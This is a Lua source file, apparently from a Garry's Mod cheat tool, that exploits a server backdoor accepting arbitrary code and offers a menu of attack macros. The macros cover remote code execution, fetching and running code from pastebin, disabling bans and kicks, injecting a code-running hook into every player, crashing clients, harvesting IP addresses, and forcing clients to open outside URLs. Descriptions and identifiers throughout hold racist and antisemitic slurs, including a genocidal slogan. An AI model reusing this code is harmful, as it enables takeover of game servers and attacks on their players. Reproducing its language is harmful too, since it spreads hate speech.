//local odium = jit.status( 'ODIUM' ) if !istable(odium) then print('FAILED TO IMPORT ODIUM TABLE') end
 
local BD = {}
local h = http
 
 
BD.Backdoors = BD.Backdoors or {}
 
BD.CurrentBackdoor = "Generic"
 
 
 
BD.BackdoorTypes = {
 
    ["Generic"] = {
 
        ["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
 
        ["Netkey"] = "_CAC_ReadMemory",
 
    },
 
}
 
 
 
local netsss = net.Start
 
function BD.IsMessagePooled( netmessage )
 
local netfunc = netsss
 
local status, error = pcall( netfunc, netmessage )
 
return status
 
end
 
 
 
local net = net
 
 
 
 
local ctxt = chat.AddText
 
function BD.ChatText( message, col )
 
    ctxt( Color(195,205,255,255), "[Blackdoor] ", col, message )
 
end
 
 
 
function BD.PingBackDoors()
 
    local bds = {}
 
    for k, v in pairs(BD.BackdoorTypes) do
 
        if BD.IsMessagePooled( tostring( v.Netkey ) ) then bds[k] = true end
 
    end
 
    return bds
 
end
 
concommand.Add("bd_refresh_backdoors", function() BD.Backdoors = BD.PingBackDoors() end)
 
 
 
function BD.BackdoorActive()
 
    return table.Count( BD.Backdoors ) > 0
 
end
 
 
 
function BD.GetActive()
 
    if !BD.BackdoorTypes[BD.CurrentBackdoor] then return { ["Code"] = "local x = 69", ["Netkey"] = "" } end
 
    return BD.BackdoorTypes[BD.CurrentBackdoor]
 
end
 
 
 
BD.BDMacros ={
 
 
 
    ["Artillery Strike"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[if !bombstrike then
 
            hook.Add("Think", "lulz_bombstrike", function()
 
            local explode = ents.Create( "env_explosion" )
 
            local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
 
            local trc = {}
 
            trc.start = ps
 
            trc.endpos = ps + Vector( 0, 0, -99999)
 
            local tr = util.TraceLine(trc)
 
            if !tr.Hit then return end
 
            explode:SetPos( tr.HitPos )
 
            explode:Spawn()
 
            explode:SetKeyValue( "iMagnitude", "400" )
 
            explode:Fire( "Explode", 0, 0 )
 
            end)
 
            bombstrike = true
 
            else
 
            hook.Remove("Think", "lulz_bombstrike")
 
            bombstrike = false
 
            end]],
 
        ["Desc"] = "Explode the shit out of everything",
 
    },
 
 
 
 
 
    ["@ Inject SendLua Interface"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
    util.AddNetworkString( "cucked" )
 
    function BDSendLua( p, str ) net.Start( "cucked" ) net.WriteString( str ) net.Send( p ) end
 
    function BDSendLuaAll( str ) net.Start( "cucked" ) net.WriteString( str ) net.Broadcast() end
 
    function BDInjectAids( p ) p:SendLua( 'net.Receive( "cucked", function() RunString( net.ReadString() ) end )' ) end
 
    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
 
    hook.Add( "PlayerInitialSpawn", "youonlygetcuckedagain", function( p ) BDInjectAids( p ) end)
 
        ]],
 
        ["Desc"] = "You need this to use certain macros",
 
    },
 
 
 
    ["Announce centre screen"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],
 
        ["Desc"] = "Make an announcement in the centre of everybodys screen",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Rainbow chat spam"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
        if !timer.Exists( "lulz_chatspam" ) then
 
            timer.Create( "lulz_chatspam", 0.5, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)
 
        else
 
            timer.Remove( "lulz_chatspam" )
 
        end]],
 
        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Rainbow chat spam (Turbo)"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
        if !timer.Exists( "lulz_chatspam" ) then
 
            timer.Create( "lulz_chatspam", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)
 
        else
 
            timer.Remove( "lulz_chatspam" )
 
        end]],
 
        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Unlock all doors"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Toggle all doors"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Broken Glass Symphony"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
    if !timer.Exists( "A true masterpiece" ) then
 
        timer.Create( "A true masterpiece", 0.2, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )
 
            end
 
        end)
 
    else
 
        timer.Remove( "A true masterpiece" )
 
    end]],
 
        ["Desc"] = "Beethoven's last hidden symphony, only rediscovered in 2017",
 
    },
 
 
 
    ["Yeah Baby"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
        if !timer.Exists( "porn" ) then
 
        timer.Create( "porn", 0.3, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )
 
            end
 
        end)
 
        else
 
            timer.Remove( "porn" )
 
        end]],
 
        ["Desc"] = "YEAH BABY YEAH",
 
    },
 
 
 
    ["Street War"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
        if !timer.Exists( "cwar" ) then
 
        timer.Create( "cwar", 1, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )
 
            end
 
        end)
 
        else
 
            timer.Remove( "cwar" )
 
        end]],
 
        ["Desc"] = "For when you need more dakka",
 
    },
 
 
 
    ["Earthquake"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
        if !timer.Exists( "earthquake" ) then
 
        timer.Create( "earthquake", 0.5, 500, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )
 
                p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )
 
                util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )
 
                p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )
 
            end
 
 
 
            for _, e in pairs(ents.GetAll()) do
 
                if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end
 
            end
 
 
 
 
 
        end)
 
        else
 
            timer.Remove( "earthquake" )
 
        end]],
 
        ["Desc"] = "For when you need more dakka",
 
    },
 
 
 
    ["Seize the server"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
 
        hook.Add("PlayerInitialSpawn", "gw_siezed", function( ply ) ply:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://globalwraith.com/util/seized.html" )') end)
 
        for k, v in pairs(player.GetAll()) do
 
            v:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://odium.pro" )')
 
        end]],
 
        ["Desc"] = "Display the seized by wraithnet message to all players",
 
    },
 
 
 
    ["Explode all vehicles"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
 
        local explo = ents.Create("env_explosion")
 
        explo:SetPos(v:GetPos())
 
        explo:SetKeyValue("iMagnitude", "300")
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire("Explode", "", 0)
 
        end
 
        end]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["RCON command"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[game.ConsoleCommand( @1.."\n" )]],
 
        ["Desc"] = "Like having rcon access without actually having rcon access",
 
    },
 
 
 
    ["Lua run"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[@1]],
 
        ["Desc"] = "For running your dank luas",
 
    },
 
 
 
    ["Lua run from pastebin"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[http.Fetch( "@1", function( b, l, h, c ) RunString( b ) end, function() end )]],
 
        ["Desc"] = "Fetch and run code from a pastebin link ( remember to use raw you stupid faggot eg. https://pastebin.com/raw/fHeygLt9 )",
 
    },
 
 
 
    ["Destroy ULX Ban/Kick"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[ULib.Ban = function() return false end
 
        ULib.addBan = function() return end
 
        ULib.kick = function() return end]],
 
        ["Desc"] = "Completely break ulx ban and ulx kick so you can't be locked out of the server",
 
    },
 
 
 
 
 
 
 
------------------------ player targeted macros ------------------------
 
 
 
    ["Kill player"] = {
 
        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous
 
        ["Code"] = [[v:Kill()]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Fumble player"] = {
 
        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous
 
        ["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],
 
        ["Desc"] = "Knocks their current weapon out of their hand",
 
    },
 
 
 
    ["Strip weapons"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:StripWeapons()]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Rocket"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],
 
        ["Desc"] = "Sends them flying up into the air",
 
    },
 
 
 
    ["Rocket (Spastic)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:SetVelocity( Vector(math.random( -9000, 9000), math.random( -9000, 9000), 9000) )]],
 
        ["Desc"] = "HOLY SHIIIIIIIIIIIT",
 
    },
 
 
 
    ["Change model"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:SetModel( @1 )]],
 
        ["Desc"] = "Set their player model to the specified string (1st paremeter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Set health + armor"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:SetHealth( @1 ) v:SetArmor( @2 ) ]],
 
        ["Desc"] = "Sets their health (1st paremeter) and armor (2nd paremeter)",
 
        ["NeedsParameters"] = 2,
 
    },
 
 
 
    ["Ear rape"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local snd = {
 
            [1] = "npc/stalker/go_alert2a.wav",
 
            [2] = "vo/npc/male01/question06.wav",
 
            [3] = "ambient/energy/zap1.wav",
 
            [4] = "weapons/knife/knife_stBD.wav",
 
            [5] = "vo/ravenholm/madlaugh04.wav",
 
            [6] = "npc/antlion_guard/antlion_guard_die1.wav",
 
            [7] = "vo/breencast/br_collaboration01.wav,"
 
        }
 
        v:EmitSound( snd[tonumber(@1)], 100, 100 )
 
        ]],
 
        ["Desc"] = "Make them emit a sound (1st paremeter is a number 1-7)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Ear rape (from internet)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )
 
        ]],
 
        ["Desc"] = "Make them hear a sound from a URL (1st paremeter).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Eye rape (from internet)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        BDSendLua( v, 'if bdeyerape then bdeyerape:Remove() bdeyerape = nil return end bdeyerape = vgui.Create( "DFrame" )bdeyerape:SetDraggable( false )bdeyerape:SetSize( ScrW(), ScrH() )bdeyerape:SetTitle( "" )bdeyerape:ShowCloseButton( false )local html = vgui.Create( "HTML", bdeyerape )html:Dock( FILL )html:OpenURL( @1 )' )
 
        ]],
 
        ["Desc"] = "Make them see a full screen, unclosable panel from a URL (1st paremeter).  Sending a new url will stop the previous one.  Send an invalid url to clear their view entirely",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Rave Mode"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
            BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )
 
        ]],
 
        ["Desc"] = "Make them loosen up and join the party",
 
    },
 
 
 
    ["Rave Music"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
            BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )
 
        ]],
 
        ["Desc"] = "DOOF DOOF NIGGA",
 
    },
 
 
 
    ["Whisper"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:ChatPrint( @1 )]],
 
        ["Desc"] = "Anonymously whisper text into their chatbox (1st paremeter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Whisper (advanced)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        BDSendLua( v, 'chat.AddText( Color( @2, @3, @4 ), @1 )' )
 
        ]],
 
        ["Desc"] = "Anonymously whisper coloured text into their chatbox (1st paremeter = text, 2nd = r, 3rd = g, 4th = b)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Ignite player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:Ignite( 30 )]],
 
        ["Desc"] = "Ignite players for 30 seconds, spam repeatedly to refresh the duration",
 
    },
 
 
 
    ["Toggle godmode"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Crash their gmod"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],
 
        ["Desc"] = "Instantly freezes their game solid, the only way to fix it is ctrl-alt-delete or a computer restart",
 
    },
 
 
 
    ["Toggle serverside speedhack"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],
 
        ["Desc"] = "GOTTA GO FAST",
 
    },
 
 
 
    ["Freeze/Unfreeze player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:Freeze( !v:IsFrozen() )]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Force say"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:Say(@1)]],
 
        ["Desc"] = "Forces them to say the specified string in chat (first parameter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
 
 
    ["Force concommand"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:ConCommand(@1)]],
 
        ["Desc"] = "Forces them to run the specified console command (first parameter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Grab IP"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ for _, p in pairs(player.GetAll()) do if %LP then p:ChatPrint( v:Nick().." : "..v:IPAddress() ) end end]],
 
        ["Desc"] = "Prints their IP Address to your console",
 
    },
 
 
 
 
 
    ["DarkRP add/remove money"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:addMoney(@1)]],
 
        ["Desc"] = "Adds money to their wallet (first parameter) remember that you can use negative numbers to subtract money",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["DarkRP force job"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],
 
        ["Desc"] = "Change their team to the specified job (1st parameter = job name, does not require capitalization)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Force team switch"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:SetTeam( i ) end end]],
 
        ["Desc"] = "Change their team to the specified team name (1st parameter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Noclip player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],
 
        ["Desc"] = "Toggles noclip on the specified players",
 
    },
 
 
 
    ["Give weapon to player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:Give( @1 )]],
 
        ["Desc"] = "Gives this player a weapon (first parameter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Give ammo to player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:GiveAmmo( @1, @2, false )]],
 
        ["Desc"] = "Gives this player some ammo (first parameter = amount of ammo, secound parameter = ammo type)",
 
        ["NeedsParameters"] = 2,
 
    },
 
 
 
    ["Teleport (them to your cursor)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
            local tp = false
 
            local tpos
 
            for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end
 
            if tp then v:SetPos( tpos ) end
 
        ]],
 
        ["Desc"] = "Teleports the selected players to your cursor location, not recommended for more than 1 person at once",
 
    },
 
 
 
    ["Teleport (you to them)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
            local tp = false
 
            local tpos = v:GetPos() + Vector( 32, 0, 10)
 
            for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end
 
        ]],
 
        ["Desc"] = "Teleport yourself to the selected player, may end with you stuck inside a wall",
 
    },
 
 
 
    ["Teleport (blink)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
            local tpos = v:GetEyeTraceNoCursor().HitPos
 
            v:SetPos( tpos )
 
        ]],
 
        ["Desc"] = "Use on yourself or others to warp them to where they are looking",
 
    },
 
 
 
    ["Spawn entity near player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local tr = {}
 
        tr.start = v:GetShootPos()
 
        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
 
        tr.filter = {v}
 
        local trace = util.TraceLine(tr)
 
        local dix = ents.Create( @1 )
 
        dix:SetPos(trace.HitPos)
 
        dix:SetAngles(Angle(0,0,0))
 
        dix:Spawn()
 
        ]],
 
        ["Desc"] = "Spawn an entity in front of this player (first parameter = entity class), cannot spawn cars!",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Spawn prop near player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local tr = {}
 
        tr.start = v:GetShootPos()
 
        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
 
        tr.filter = {v}
 
        local trace = util.TraceLine(tr)
 
        local dix = ents.Create( "prop_physics" )
 
        dix:SetPos(trace.HitPos)
 
        dix:SetAngles(Angle(0,0,0))
 
        dix:SetModel( @1 )
 
        dix:Spawn()
 
        ]],
 
        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Spawn odium shrine"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local tr = {}
 
        tr.start = v:GetShootPos()
 
        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
 
        tr.filter = {v}
 
        local trace = util.TraceLine(tr)
 
        local dix = ents.Create( "prop_physics" )
 
        dix:SetPos( trace.HitPos + Vector( 0, 0, 70 ) )
 
        dix:SetAngles( v:GetAngles() )
 
        dix:SetModel( "models/props_c17/gravestone_cross001a.mdl" )
 
        dix:Spawn()
 
        dix:SetMoveType( MOVETYPE_NONE )
 
        dix:SetMaterial( "models/shiny" )
 
        dix:SetColor( Color( 0, 0, 40 ) )
 
 
 
        local function ecr( parent, model, pos, ang, col, mat  )
 
            local dix = ents.Create( "prop_physics" )
 
            dix:SetPos( parent:LocalToWorld( pos ) )
 
            dix:SetAngles( parent:LocalToWorldAngles( ang ) )
 
            dix:SetModel( model )
 
            dix:SetParent( parent )
 
            dix:Spawn()
 
            dix:SetColor( col )
 
            dix:SetMaterial( mat )
 
        end
 
 
 
        ecr( dix, "models/props_c17/gravestone_coffinpiece001a.mdl", Vector( -65, 0, -60 ), Angle( 0, 180, 0 ), Color( 40, 40, 80 ), "models/shiny"  )
 
        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 18, 35 ), Angle( 0, 0, 0 ), Color( 80, 80, 180 ), "models/shiny"  )
 
        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 6, 65 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )
 
        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, 71, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )
 
        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, -59, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )
 
 
 
        for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(200, 200, 255 ), "Heil odium.pro, god of cheating")' ) sound.Play( "ambient/explosions/explode_8.wav", p:GetPos(), 90, 80, 1 ) end
 
 
 
        ]],
 
        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",
 
    },
 
 
 
 
 
 
 
    ["Spawn evil npc near player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local tr = {}
 
        tr.start = v:GetShootPos()
 
        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
 
        tr.filter = {v}
 
        local trace = util.TraceLine(tr)
 
        local dix = ents.Create( "npc_citizen" )
 
        dix:SetPos(trace.HitPos)
 
        dix:SetAngles(Angle(0,0,0))
 
        dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )
 
        dix:SetKeyValue( "citizentype", 3 )
 
        dix:AddRelationship("player D_HT 200")
 
        dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)
 
        dix:SetSchedule( SCHED_IDLE_WANDER )
 
        dix:Spawn()
 
        ]],
 
        ["Desc"] = "Spawn a hostile NPC in front of this player",
 
    },
 
 
 
    ["Death ray"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local trace = v:GetEyeTraceNoCursor()
 
        if trace.Entity:IsValid() then trace.Entity:Remove() end
 
        ]],
 
        ["Desc"] = "Vaporize whatever this player is looking at",
 
    },
 
 
 
    ["Death ray (explosive)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local trace = v:GetEyeTraceNoCursor()
 
        local explo = ents.Create("env_explosion")
 
        explo:SetPos(trace.HitPos)
 
        explo:SetKeyValue("iMagnitude", "250")
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire("Explode", "", 0)
 
        ]],
 
        ["Desc"] = "Blow up whatever this player is looking at",
 
    },
 
 
 
    ["Precise Artillery Strike"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local trace = v:GetEyeTraceNoCursor()
 
        timer.Create( "uiashfuasfas"..v:UniqueID()..math.random(-9999, 99999), 0.2, 15, function()
 
        local explo = ents.Create("env_explosion")
 
        explo:SetPos(trace.HitPos + Vector( math.random( -500, 500), math.random( -500, 500), math.random( -500, 500) ) )
 
        explo:SetKeyValue("iMagnitude", "250")
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire("Explode", "", 0)
 
        end)
 
        ]],
 
        ["Desc"] = "Blow up whatever this player is looking at",
 
    },
 
 
 
    ["Woman Driver"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local trace = v:GetEyeTraceNoCursor()
 
        local car = ents.Create("prop_physics")
 
        local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )
 
        car:SetModel( "models/props_vehicles/car002a_physics.mdl" )
 
        car:SetAngles( v:GetAngles() )
 
        car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )
 
        car:Spawn()
 
        car:Activate()
 
        car.boom = 6
 
        car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )
 
        car:Ignite( 500 )
 
        car:AddCallback( "PhysicsCollide", function( car, dat )
 
            local explo = ents.Create("env_explosion")
 
            explo:SetPos( car:GetPos() )
 
            explo:SetKeyValue("iMagnitude", "350")
 
            explo:Spawn()
 
            explo:Activate()
 
            explo:Fire("Explode", "", 0)
 
            local ef = EffectData()
 
            ef:SetOrigin( car:GetPos() )
 
            ef:SetMagnitude( 5 )
 
            ef:SetScale( 200 )
 
            util.Effect( "ThumperDust", ef )
 
            car.boom = car.boom - 1
 
            if car.boom < 0 then car:Remove() end
 
        end )
 
        timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)
 
        ]],
 
        ["Desc"] = "Make exploding vehicles rain from the sky",
 
    },
 
 
 
 
 
 
 
    ["Poison Gas"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local trace = v:GetEyeTraceNoCursor()
 
        local ar2Explo = ents.Create("env_ar2explosion")
 
        ar2Explo:SetOwner(game.GetWorld())
 
        local p = trace.HitPos
 
        ar2Explo:SetPos(trace.HitPos)
 
        ar2Explo:Spawn()
 
        ar2Explo:Activate()
 
        ar2Explo:Fire("Explode", "", 0)
 
        timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()
 
            for _, ent in pairs(ents.FindInSphere( p, 500)) do
 
                if !ent:IsPlayer() then continue end
 
                local d = DamageInfo()
 
                d:SetDamage( 1 )
 
                d:SetAttacker( game.GetWorld() )
 
                d:SetInflictor( game.GetWorld() )
 
                d:SetDamageType( DMG_DROWN )
 
                ent:TakeDamageInfo( d )
 
            end
 
        end)
 
 
 
        ]],
 
        ["Desc"] = "GAS THE JEWS RACE WAR NOW",
 
    },
 
 
 
 
 
    ["Spawn vehicle near player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local trc = {}
 
        trc.start = v:GetShootPos()
 
        trc.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
 
        trc.filter = {v}
 
        local tr = util.TraceLine(trc)
 
 
 
        local VehicleList = list.Get( "Vehicles" )
 
        local vehicle = VehicleList[ @1 ]
 
        if ( !vehicle ) then return end
 
        local Angles = v:GetAngles()
 
        Angles.pitch = 0
 
        Angles.roll = 0
 
        Angles.yaw = Angles.yaw + 180
 
   
 
        local pos = tr.HitPos
 
        if ( vehicle.Offset ) then
 
            pos = pos + tr.HitNormal * vehicle.Offset
 
        end
 
        local Ent = ents.Create( vehicle.Class )
 
        if ( !Ent ) then return end
 
        duplicator.DoGeneric( Ent, vehicle )
 
        if ( vehicle.Model == "models/buggy.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jeep_test.txt" ) end
 
        if ( vehicle.Model == "models/vehicle.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jalopy.txt" ) end
 
        if ( vehicle && vehicle.KeyValues ) then
 
            for k, v in pairs( vehicle.KeyValues ) do
 
                Ent:SetKeyValue( k, v )
 
            end
 
        end
 
        Ent:SetModel( vehicle.Model )
 
        Ent:SetAngles( Angles )
 
        Ent:SetPos( pos )
 
        Ent:Spawn()
 
        Ent:Activate()
 
        if ( Ent.SetVehicleClass && @1 ) then Ent:SetVehicleClass( @1 ) end
 
        Ent.VehicleName = vehicle.Class
 
        Ent.VehicleTable = @1
 
        Ent.ClassOverride = vehicle.Class
 
        ]],
 
        ["Desc"] = "Spawn a vehicle in front of this player (first parameter = vehicle class), don't try to spawn ents with this ya dingus!",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
    ["Kick player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ v:Kick( @1 ) ]],
 
        ["Desc"] = "First parameter = reason for kick",
 
    },
 
 
 
    ["slaverize player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ if !v.slavered then v:SetColor( Color( 0, 0, 0 ) ) v.slavered = true else v:SetColor( Color(255, 255, 255) ) v.slavered = false end ]],
 
        ["Desc"] = "Turns them black as night",
 
    },
 
 
 
    ["Cloak player"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],
 
        ["Desc"] = "Toggles cloaking on the player, people can still see the weapon they are holding however",
 
    },
 
 
 
